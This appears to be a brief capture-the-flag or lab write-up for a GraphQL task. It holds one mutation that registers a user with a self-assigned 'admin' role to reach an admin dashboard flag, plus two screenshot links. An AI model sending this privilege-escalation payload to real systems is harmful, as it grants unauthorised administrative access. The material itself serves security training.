# [Mutations](Mutations.md)
### What is the flag you find in the admin dashboard?

```graphql
mutation { registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) { user { username password msg role } } }
```
![](Screenshot%202026-09-14%20at%2014.31.25.png)
![](Screenshot%202026-09-14%20at%2014.35.53.png)